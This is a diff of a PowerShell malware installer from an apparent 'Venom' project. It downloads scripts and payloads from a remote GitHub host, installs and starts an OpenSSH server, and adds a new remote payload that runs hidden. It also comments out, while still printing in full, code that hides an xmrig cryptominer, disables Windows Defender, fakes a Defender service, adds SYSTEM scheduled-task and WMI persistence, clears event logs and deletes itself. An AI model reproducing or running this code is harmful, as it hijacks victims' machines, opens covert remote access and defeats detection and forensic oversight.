@@ -55,6 +55,8 @@ Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubuserconten
 Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat" -OutFile "w.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks2.ps1" -OutFile "edp.ps1"
+
 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -71,7 +73,7 @@ New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
-Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+#Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
 
 # Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
@@ -117,148 +119,151 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 #Requires -RunAsAdministrator
 #$env:SystemRoo
-# Define hidden payload path
-$hiddenDir = "C:\ProgramData\Microsoft\Windows NT"
-#$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"  #Join-Path $hiddenDir $payloadName
-#$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
+# # Define hidden payload path
+# $hiddenDir = "C:\ProgramData\Microsoft\Windows NT"
+# #$payloadName = "svchost.exe"
+# $destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"  #Join-Path $hiddenDir $payloadName
+# #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
-# mkdir "$hiddenDir\xmrig-6.22.2"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$hiddenDir"
+# # mkdir "$hiddenDir\xmrig-6.22.2"
+# Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$hiddenDir"
 
-# Create hidden directory
-if (-not (Test-Path $hiddenDir)) {
-    New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
-    attrib.exe +s +h $hiddenDir
-}
+# # Create hidden directory
+# if (-not (Test-Path $hiddenDir)) {
+#     New-Item -Path $hiddenDir -ItemType Directory -Force | Out-Null
+#     attrib.exe +s +h $hiddenDir
+# }
 
-# Copy miner to hidden location
-#Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
-Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
-if (Test-Path -Path $newConfigPath) {
-    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "bat file has been copied successfully."
-} else {
-    Write-Output "New bat file not found at the specified path."
-}
+# # Copy miner to hidden location
+# #Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
+# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
+# Set-Variable -Value ("$hiddenDir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+# if (Test-Path -Path $newConfigPath) {
+#     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+#     Write-Output "bat file has been copied successfully."
+# } else {
+#     Write-Output "New bat file not found at the specified path."
+# }
 
-Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
-# Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "xmrig-6.22.2.exe"
-Start-Sleep -Seconds 45
-# Disable Windows Defender temporarily
-Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
+# Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
+# # Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "xmrig-6.22.2.exe"
+# Start-Sleep -Seconds 45
+# # Disable Windows Defender temporarily
+# Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+# Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
 
-# 1. Create Windows Service with auto-restart
-$serviceName = "WinDefendSvc_$((Get-Date).Ticks)"
-try {
-    New-Service -Name $serviceName `
-        -BinaryPathName "`"$destinationPath`" --donate-level=0" `
-        -DisplayName "Windows Defender Security Service" `
-        -StartupType Automatic `
-        -Description "Provides system security services" | Out-Null
+# # 1. Create Windows Service with auto-restart
+# $serviceName = "WinDefendSvc_$((Get-Date).Ticks)"
+# try {
+#     New-Service -Name $serviceName `
+#         -BinaryPathName "`"$destinationPath`" --donate-level=0" `
+#         -DisplayName "Windows Defender Security Service" `
+#         -StartupType Automatic `
+#         -Description "Provides system security services" | Out-Null
     
-    # Configure service recovery
-    sc.exe failure $serviceName reset= 0 actions= restart/5000/restart/5000/restart/5000 | Out-Null
-    Start-Service -Name $serviceName -ErrorAction Stop
-}
-catch {
-    Write-Warning "Service creation failed: $($_.Exception.Message)"
-}
+#     # Configure service recovery
+#     sc.exe failure $serviceName reset= 0 actions= restart/5000/restart/5000/restart/5000 | Out-Null
+#     Start-Service -Name $serviceName -ErrorAction Stop
+# }
+# catch {
+#     Write-Warning "Service creation failed: $($_.Exception.Message)"
+# }
 
-# 2. Create SYSTEM-level Scheduled Task
-$taskName = "WinDefendTask_$((Get-Date).Ticks)"
-try {
-    # Added -WindowStyle Hidden to prevent console window popup
-    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=0" -WindowStyle Hidden
-    $trigger1 = New-ScheduledTaskTrigger -AtStartup
-    $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
+# # 2. Create SYSTEM-level Scheduled Task
+# $taskName = "WinDefendTask_$((Get-Date).Ticks)"
+# try {
+#     # Added -WindowStyle Hidden to prevent console window popup
+#     $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=0" -WindowStyle Hidden
+#     $trigger1 = New-ScheduledTaskTrigger -AtStartup
+#     $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
     
-    $settings = New-ScheduledTaskSettingsSet `
-        -Hidden `  # This hides the task in Task Scheduler UI
-        -DontStopIfGoingOnBatteries `
-        -StartWhenAvailable `
-        -MultipleInstances Ignore
+#     $settings = New-ScheduledTaskSettingsSet `
+#         -Hidden `  # This hides the task in Task Scheduler UI
+#         -DontStopIfGoingOnBatteries `
+#         -StartWhenAvailable `
+#         -MultipleInstances Ignore
 
-    Register-ScheduledTask -TaskName $taskName `
-        -Action $action `
-        -Trigger $trigger1, $trigger2 `
-        -Settings $settings `
-        -User "NT AUTHORITY\SYSTEM" `
-        -RunLevel Highest `
-        -Force | Out-Null
-}
-catch {
-    Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
-}
+#     Register-ScheduledTask -TaskName $taskName `
+#         -Action $action `
+#         -Trigger $trigger1, $trigger2 `
+#         -Settings $settings `
+#         -User "NT AUTHORITY\SYSTEM" `
+#         -RunLevel Highest `
+#         -Force | Out-Null
+# }
+# catch {
+#     Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
+# }
 
-# 3. WMI Event Subscription
-try {
-    $wmiQuery = @"
-    SELECT * FROM __InstanceModificationEvent WITHIN 60 
-    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
-    AND TargetInstance.SystemUpTime >= 300
-"@
+# # 3. WMI Event Subscription
+# try {
+#     $wmiQuery = @"
+#     SELECT * FROM __InstanceModificationEvent WITHIN 60 
+#     WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
+#     AND TargetInstance.SystemUpTime >= 300
+# "@
 
-    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-        Name = "SysHealth_$((Get-Date).Ticks)"
-        EventNamespace = 'root\cimv2'
-        Query = $wmiQuery
-        QueryLanguage = 'WQL'
-    }
+#     $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+#         Name = "SysHealth_$((Get-Date).Ticks)"
+#         EventNamespace = 'root\cimv2'
+#         Query = $wmiQuery
+#         QueryLanguage = 'WQL'
+#     }
 
-    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-        Name = "SysMaint_$((Get-Date).Ticks)"
-        CommandLineTemplate = "`"$destinationPath`" --donate-level=1"
-        RunInteractively = $false
-    }
+#     $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+#         Name = "SysMaint_$((Get-Date).Ticks)"
+#         CommandLineTemplate = "`"$destinationPath`" --donate-level=1"
+#         RunInteractively = $false
+#     }
 
-    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-        Filter = $filter.__PATH
-        Consumer = $consumer.__PATH
-    }
-}
-catch {
-    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
-}
+#     $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+#         Filter = $filter.__PATH
+#         Consumer = $consumer.__PATH
+#     }
+# }
+# catch {
+#     Write-Warning "WMI persistence failed: $($_.Exception.Message)"
+# }
 
-# 4. Immediate Execution (Hidden)
-if (-not (Get-Process -Name (Get-Item $destinationPath).BaseName -ErrorAction SilentlyContinue)) {
-    Start-Process $destinationPath -ArgumentList "--donate-level=0" -WindowStyle Hidden
-}
+# # 4. Immediate Execution (Hidden)
+# if (-not (Get-Process -Name (Get-Item $destinationPath).BaseName -ErrorAction SilentlyContinue)) {
+#     Start-Process $destinationPath -ArgumentList "--donate-level=0" -WindowStyle Hidden
+# }
 
-# 5. Anti-Forensic Measures
-# Clear current logs
-wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" /q 2>$null
-wevtutil.exe cl "System" /q 2>$null
+# # 5. Anti-Forensic Measures
+# # Clear current logs
+# wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" /q 2>$null
+# wevtutil.exe cl "System" /q 2>$null
 
-# Create scheduled log cleaner
-$logCleanupScript = {
-    wevtutil.exe cl "Security" /q 2>$null
-    wevtutil.exe cl "Application" /q 2>$null
-    wevtutil.exe cl "Microsoft-Windows-WMI-Activity/Operational" /q 2>$null
-}
+# # Create scheduled log cleaner
+# $logCleanupScript = {
+#     wevtutil.exe cl "Security" /q 2>$null
+#     wevtutil.exe cl "Application" /q 2>$null
+#     wevtutil.exe cl "Microsoft-Windows-WMI-Activity/Operational" /q 2>$null
+# }
 
-$logCleanupScript | Out-File "$hiddenDir\logclean.ps1" -Force
-Register-ScheduledTask -TaskName "LogMaintenance_$((Get-Date).Ticks)" `
-    -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenDir\logclean.ps1`" -WindowStyle Hidden") `
-    -Trigger (New-ScheduledTaskTrigger -Daily -At 3AM) `
-    -Settings (New-ScheduledTaskSettingsSet -Hidden) `
-    -User "NT AUTHORITY\SYSTEM" `
-    -Force | Out-Null
+# $logCleanupScript | Out-File "$hiddenDir\logclean.ps1" -Force
+# Register-ScheduledTask -TaskName "LogMaintenance_$((Get-Date).Ticks)" `
+#     -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenDir\logclean.ps1`" -WindowStyle Hidden") `
+#     -Trigger (New-ScheduledTaskTrigger -Daily -At 3AM) `
+#     -Settings (New-ScheduledTaskSettingsSet -Hidden) `
+#     -User "NT AUTHORITY\SYSTEM" `
+#     -Force | Out-Null
 
-# 6. Self-Destruct
-$selfDestructCommand = @"
-Start-Sleep 15
-Remove-Item -Path "$PSCommandPath" -Force -ErrorAction SilentlyContinue
-"@
+# # 6. Self-Destruct
+# $selfDestructCommand = @"
+# Start-Sleep 15
+# Remove-Item -Path "$PSCommandPath" -Force -ErrorAction SilentlyContinue
+# "@
 
-$selfDestructCommand | Out-File "$env:TEMP\cleanup.ps1" -Force
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$env:TEMP\cleanup.ps1`"" -WindowStyle Hidden
+# $selfDestructCommand | Out-File "$env:TEMP\cleanup.ps1" -Force
+# Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$env:TEMP\cleanup.ps1`"" -WindowStyle Hidden
 
 #Start-Process -FilePath "$path\AEQKCPrkuifY.ps1" -windowstyle hidden
-Start-Sleep -Seconds 360
+
+Start-Process -Set-ExecutionPolicy Bypass -FilePath "$path\edp.ps1" -windowstyle hidden
+
+Start-Sleep -Seconds 10
 
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
